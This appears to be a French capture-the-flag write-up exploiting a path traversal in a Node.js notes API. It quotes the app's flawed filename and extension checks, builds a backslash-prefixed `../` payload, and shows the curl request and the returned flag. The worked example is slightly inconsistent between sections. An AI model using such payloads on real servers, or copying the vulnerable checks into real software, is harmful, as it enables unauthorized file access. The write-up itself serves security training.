## Sanitization

On relève une fonction qui sanitize le chemin d'accès au fichier est sanitizé par la fonction `path.resolve`.

```js
// 📂 Récupère le chemin sécurisé avec le bon format de fichier
const getFullPath = (dirPath, fileName = "", fileType = "md") => {

  const sanitizedFileName = sanitizeFileExtension(fileName, fileType) ;
  // Résout le chemin complet pour éviter toute attaque path traversal
  const basePath = path.resolve(STORAGE_DIR, dirPath);
  const fullPath = fileName ? basePath+sanitizedFileName : basePath;
  // Vérifie que basePath est bien dans STORAGE_DIR
  if (!basePath.startsWith(STORAGE_DIR)) {
    throw new Error("Chemin non autorisé !");
  }

  return fullPath;
};
```

En renvanche si il y a un backslash, tout ce qu'il y a après est interprété sans sanitization.

```js
const sanitizeFileName = (fileName) => {
  lastSlash = fileName.lastIndexOf('\\');
  if (lastSlash !== -1){
    fileName = fileName.slice(lastSlash + 1);
  } else
  {
    lastSlash = fileName.lastIndexOf('/');
    if (lastSlash !== -1){
      fileName = fileName.slice(lastSlash + 1);
    }
  }
  return fileName;
};
```

Pour l'accès au fichier on garde le .md à la fin de la payload

```js
const sanitizeFileExtension = (fileName, fileType) => {
  fileName = sanitizeFileName(fileName);
  if (fileName.includes('html')){
    return fileName;
  };
  if (fileName.includes('md')){
    return fileName;
  }
  extension = 'error';
  if (fileType === "html") {
    extension = "html";
  }
  if (fileType === "md") {
    extension = "md";
  }
  return `${fileName}.${extension}`;
};
```

## Crafting payload

On choisit un dossier existant `MyVeryFirstNote -> basePath = /app/src/storage/MyVeryFirstNote`
On forge le paramètre file :

```
\md/../../../../../../../../../../flag.txt
```

Le premier caractère est le backslash `\` (encodé `%5c` en URL).
Après nettoyage il ne reste que `md/../../../…/flag.txt` (conserve « md »).

La concaténation produit quelque chose comme :

```
/app/src/storage/a  +  md/../../../../../../../../../../flag.txt
-> /app/src/storage/amd/../../../../../../../../../../flag.txt
```

on sort donc complètement de `storage/` pour finir sur /flag.txt.

## Getting the flag

```bash
curl -s "http://23.251.131.67:32881/api/file?path=MyVeryFirstNote&file=%5c/md/../../../../../../../../../../flag.txt"
```

- `path=MyVeryFirstNote` : dossier légitime.
- `file=%5c/md/../../../../../../../../../../flag.txt`
- `%5c` = `\` URL-encodé
- `md/../../` effectue le path-traversal.

# Flag 

```
{"content":"HNx04{4ff80656112e8beaf4a74710085f25ed}\n"}
```
